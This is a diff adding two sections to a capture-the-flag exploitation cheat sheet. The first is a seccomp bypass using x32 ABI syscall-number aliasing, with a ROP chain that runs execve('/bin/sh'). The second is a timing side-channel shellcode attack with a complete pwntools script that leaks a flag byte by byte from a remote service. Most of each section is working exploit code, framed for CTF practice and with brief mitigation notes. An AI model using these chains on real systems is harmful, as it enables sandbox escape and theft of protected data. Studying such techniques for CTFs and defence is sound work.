@@ -16,6 +16,8 @@
   - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
   - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
 - [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
+- [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
+- [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
 - [Useful Commands](#useful-commands)
 
 For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).
@@ -332,6 +334,119 @@ payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes
 **Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.
 
 **Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.
+
+---
+
+## x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)
+
+**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.
+
+```c
+// Standard execve blocked by seccomp: syscall 59
+// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
+// Often passes through BPF filters that check for exact match on 59
+syscall(0x4000003B, "/bin/sh", NULL, NULL);
+```
+
+```python
+from pwn import *
+
+# ROP chain using x32 ABI syscall number to bypass seccomp
+pop_rax = libc_base + rax_gadget
+pop_rdi = libc_base + rdi_gadget
+pop_rsi = libc_base + rsi_gadget
+pop_rdx = libc_base + rdx_gadget
+syscall_ret = libc_base + syscall_gadget
+
+rop = flat(
+    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
+    pop_rdi, binsh_addr,              # "/bin/sh"
+    pop_rsi, 0,                       # argv = NULL
+    pop_rdx, 0,                       # envp = NULL
+    syscall_ret,                      # trigger x32 execve
+)
+```
+
+**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).
+
+**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.
+
+**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.
+
+**References:** BCTF 2017
+
+---
+
+## Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)
+
+**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.
+
+```nasm
+; Read flag into buffer, then compare character N
+; Assumes flag has been read into rsi via allowed read() syscall
+mov al, [rsi + N]      ; flag byte N
+cmp al, 0x41           ; compare with guess 'A'
+jne done               ; skip if no match
+; Timing loop: burns ~4 seconds on match
+xor ecx, ecx
+.loop: inc ecx
+cmp ecx, 0xffffffff
+jne .loop
+done: xor edi, edi
+mov eax, 60            ; exit
+syscall
+```
+
+```python
+from pwn import *
+import time
+
+FLAG_LEN = 40
+CHARSET = string.printable
+
+def guess_byte(offset, guess_char):
+    """Send shellcode that delays if flag[offset] == guess_char"""
+    sc = shellcraft.amd64.linux.open("flag.txt", 0)
+    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
+    sc += f"""
+        mov al, byte ptr [rsp + {offset}]
+        cmp al, {ord(guess_char)}
+        jne done
+        xor ecx, ecx
+    loop:
+        inc ecx
+        cmp ecx, 0xffffffff
+        jne loop
+    done:
+        xor edi, edi
+        mov eax, 60
+        syscall
+    """
+    r = remote(host, port)
+    r.send(asm(sc))
+    start = time.time()
+    try:
+        r.recvall(timeout=6)
+    except:
+        pass
+    elapsed = time.time() - start
+    r.close()
+    return elapsed > 3.0  # Match if response took > 3 seconds
+
+flag = ""
+for i in range(FLAG_LEN):
+    for c in CHARSET:
+        if guess_byte(i, c):
+            flag += c
+            print(f"Flag so far: {flag}")
+            break
+```
+
+**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.
+
+**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).
+
+**References:** DEF CON 2017
 
 ---
 
